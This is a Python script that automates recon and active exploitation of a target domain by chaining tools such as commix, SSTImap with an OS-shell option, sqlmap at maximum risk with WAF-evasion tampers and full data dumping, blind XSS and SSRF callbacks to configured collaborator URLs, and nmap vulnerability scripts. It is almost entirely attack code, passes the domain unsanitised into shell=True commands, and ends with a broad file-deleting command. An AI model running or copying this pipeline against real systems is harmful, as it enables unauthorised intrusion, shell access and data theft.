import subprocess
import os
import argparse

def execute_command(command):
    subprocess.run(command, shell=True)

def print_subdomain_header(header_text):
    print("\033[1;31;40m\033[6;40m", header_text, "\033[0m")

def get_url_from_config(config_file, option):
    with open(config_file, "r") as file:
        for line in file:
            if option in line:
                return line.strip().split("=")[1]

def domains_search(domain, commands, output_dir):
    # Execute each command for domain enumeration
    for i, (header_text, cmd) in enumerate(commands):
        if header_text:
            print_subdomain_header(header_text)
        cmd(domain, output_dir)

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Domain enumeration script")
    parser.add_argument("-d", "--domain", type=str, help="Domain to perform enumeration")
    parser.add_argument("-c", "--config", type=str, help="Path to the config file", default="config.txt")
    args = parser.parse_args()

    # Check if domain is provided
    if args.domain:
        # Create output directory if it doesn't exist
        output_dir = os.path.join(os.path.dirname(__file__), "output")
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # Define Commands
        commands = [
            
            ("SubDomain Enumeration",lambda domain, output_dir: execute_command(f"bash Tools/SubEnum/subenum.sh -d {domain} -r -p")),
            ("", lambda domain, output_dir: execute_command(f"shuffledns -d {domain} -r dns-resolvers.txt -w subdomains-top1million-110000.txt -mode bruteforce | anew subs.txt")),
            ("", lambda domain, output_dir: execute_command("cat finalsubs.txt | dnsx -silent | httpx -silent| anew filterDNS.txt")),
            ("", lambda domain, output_dir: os.rename("filterDNS.txt", os.path.join(output_dir, "filterDNS.txt"))),
            ("", lambda domain, output_dir: execute_command(f"sed 's/https:\/\///' output/filterDNS.txt | anew > output/nonhttpsfilterDNS.txt")),
            ("Collecting URLS and Hidden Params ", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | httpx -silent | tee -a output/all_target_urls.txt")),
            ("", lambda domain, output_dir: execute_command(f"sudo paramspider -l output/filterDNS.txt | tee -a output/Params_list.txt |  mkdir output/Paramspider_Result | mv results output/Paramspider_Result")),
            ("SubDomain TakeOver", lambda domain, output_dir: execute_command(f"./Tools/Subhunter/subhunter -l output/nonhttpsfilterDNS.txt | tee -a output/Subdomaintakeover1.txt")),
            ("", lambda domain, output_dir: execute_command(f"./Tools/subzy/subzy run --targets output/nonhttpsfilterDNS.txt --hide_fails | tee -a output/Subdomaintakeover.txt")),
            ("CSRF Checks", lambda domain, output_dir: execute_command(f"mkdir output/csrf | xargs -a output/nonhttpsfilterDNS.txt -I{{}} sh -c 'xsrfprobe -u {{}} -d 5 -v --crawl --malicious -o output/csrf/ --no-verify --random-agent'")),
            ("HTTP Req Smuggling", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | python3 Tools/smuggler/smuggler.py -m GET,POST | tee -a output/smuggler_results.txt")),
            ("Nuclei Running", lambda domain, output_dir: execute_command(f"nuclei  -l  output/filterDNS.txt -t Tools/nuclei-templates/ -o output/nuclei_abstract_scan.txt")),
            ("", lambda domain, output_dir: execute_command(f"nuclei  -l  output/all_target_urls.txt -t Tools/nuclei-templates/ -o output/nuclei_fullurls_scan.txt")),
            ("Command Injection", lambda domain, output_dir: execute_command(f"python3 Tools/commix/commix.py -m output/filterDNS.txt --batch --crawl=5 --all --smart | tee -a commixlogs.txt")),
            ("SSTI Running", lambda domain, output_dir: execute_command(f"python3 Tools/SSTImap/sstimap.py --load-urls output/all_target_urls.txt -A --delay 3 -l 5 --os-shell | tee -a output/SSTI_Allurls_Scans.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3 Tools/SSTImap/sstimap.py --load-urls output/filterDNS.txt -A -c 5 --delay 3 -l 5 --os-shell | tee -a output/SSTI_scans.txt")),
            ("LFI Parameter Findings", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt |  gf lfi | tee -a output/lfi_params.txt")),
            ("Github Recon", lambda domain, output_dir: execute_command(f"python3 Tools/gitGraber/gitGraber.py -k Tools/gitGraber/keywordsfile.txt -q \"{domain}\"  | tee -a output/gitrecon.txt")),
            ("Github Dorking", lambda domain, output_dir: execute_command(f"python3 Tools/GitDorker/GitDorker.py -tf Tools/GitDorker/tf/TOKENSFILE -q {domain}  -d Tools/GitDorker/Dorks/alldorksv3 | tee -a output/github_dorking.txt")),
            ("Host Header Injection Testing", lambda domain, output_dir: execute_command(f"bash  Tools/Host-Header-Injection-Vulnerability-Scanner/script.sh -l output/all_target_urls.txt  | tee -a output/host_header_injection_results.txt")),
            ("Open Redirect Testing", lambda domain, output_dir: execute_command(f"python3  Tools/Oralyzer/oralyzer.py -l output/all_target_urls.txt -crlf | tee -a output/OpenRedirect.txt")),
            ("Insecure Redirect Object References Urls", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | grep -E '\.json$|\.yaml$|\.xml$|\.action$|\.ashx$|\.aspx$|\.php$|\.phtml$|\.do$|\.jsp$|\.jspx$|\.wss$|\.do$|\.action$|\.htm$|\.html$|\.xhtml$|\.rss$|\.atom$|\.ics$|\.csv$|\.tsv$|\.pdf$|\.swf$|\.svg$|\.woff$|\.eot$|\.woff2$|\.tif$|\.tiff$|\.bmp$|\.png$|\.gif$|\.jpg$|\.jpeg$|\.webp$|\.ico$|\.svgz$|\.ttf$|\.otf$|\.mid$|\.midi$|\.mp3$|\.wav$|\.avi$|\.mov$|\.mpeg$|\.mpg$|\.mkv$|\.webm$|\.ogg$|\.ogv$|\.m4a$|\.m4v$|\.mp4$|\.flv$|\.wmv$' | tee -a  output/IDOR.txt")),
            ("Nmap Scans", lambda domain, output_dir: execute_command(f"sudo nmap  -sV -sC -A -Pn -v -p- --script='Tools/freevulnsearch/freevulnsearch.nse','Tools/nmap-vulners/vulners.nse','Tools/vulscan/vulscan.nse' -oN output/nmapScan.txt -iL output/nonhttpsfilterDNS.txt ")),
            ("SSRF Running", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | bssrf -v -t 10 -l  {get_url_from_config(args.config, 'BURP_COLLAB_URL')} | tee -a output/bulkssrf_result.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3 Tools/autossrf/autossrf.py -f output/all_target_urls.txt -v | tee -a output/SSRFAUTO_result.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | ssrfuzz scan -x 'GET','POST' | tee -a ssrfuzz_results.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | sudo gf ssrf | tee -a output/ssrf_urls.txt")),
            ("SQLi Running", lambda domain, output_dir: execute_command(f"cat output/nonhttpsfilterDNS.txt | gau | sudo gf sqli | tee -a output/sqli_urls.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3  Tools/sqlmap/sqlmap.py -m 'output/sqli_urls.txt' --tamper=between,randomcase,space2comment --level=5 --risk=3 --time-sec=20 --random-agent -v 3 -b --batch   -f -a  | tee -a output/sqli_results_1.txt")),
            ("", lambda domain, output_dir: execute_command(f"python3  Tools/sqlmap/sqlmap.py -m 'output/sqli_urls.txt' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --level=5 --risk=3 --time-sec=20 --random-agent  -b --batch -f -a  | tee -a output/sqli_results_2.txt")),
            ("NOSQLi Running", lambda domain, output_dir: execute_command(f"xargs -a output/all_target_urls.txt -I{{}} sh -c 'nosqli scan --insecure  -t {{}}' | tee -a  output/Nosqli_Scan_results.txt")),
            ("XSS Running", lambda domain, output_dir: execute_command(f"cat output/filterDNS.txt | gau | Gxss -p XSS | tee -a Reflect_XSS_urls.txt ")),
            ("", lambda domain, output_dir: execute_command(f"xargs -a output/filterDNS.txt -I{{}} sh -c 'python3 Tools/XSStrike/xsstrike.py -u {{}} --crawl  --blind' | tee -a output/XSS_Results_1.txt")),
            ("", lambda domain, output_dir: execute_command(f"xargs -a output/Reflect_XSS_urls.txt -I{{}} sh -c 'python3 Tools/XSStrike/xsstrike.py -u {{}} -f XSSPayloads.txt' | tee -a output/XSS_Results_2.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | dalfox pipe | tee -a output/XSS_Results_3.txt")),
            ("", lambda domain, output_dir: execute_command(f"cat output/all_target_urls.txt | dalfox -pipe -b {get_url_from_config(args.config, 'BLIND_XSS_URL')}  | tee -a Blind_XSS_Results.txt")),
            ("OWASP Nettacker Scanner", lambda domain, output_dir: execute_command(f"python3 Tools/Nettacker/nettacker.py -l output/nonhttpsfilterDNS.txt  --profile all -t 500 | tee -a nettackerresults.txt")),
            ("CVEs Seeker", lambda domain, output_dir: execute_command(f"python3 Tools/CVESeeker/cveSeeker.py --file output/nonhttpsfilterDNS.txt --project CVESProject | tee -a output/CVEScanResult.txt && [ -d 'CVESProject' ] && mv CVESProject output/")),
            #Unlock this line only when you want very detailed result.
            #("", lambda domain, output_dir: execute_command(f"python3 Tools/Nettacker/nettacker.py -l output/all_target_urls.txt  --profile all -t 500 | tee -a output/nettackerAllUrlsresults.txt ")),
            ("", lambda domain, output_dir: execute_command(f"find . -name '*.txt' ! -path './output/*' ! -name 'dns-resolvers.txt' ! -name 'config.txt'  ! -name 'XSSPayloads.txt' ! -name 'subdomains-top1million-110000.txt' -delete"))

        ]

        # Call the function to perform domain search with provided domain and commands
        domains_search(args.domain, commands, output_dir)
    else:
        print("Please provide a domain using the -d option.")

if __name__ == "__main__":
    main()


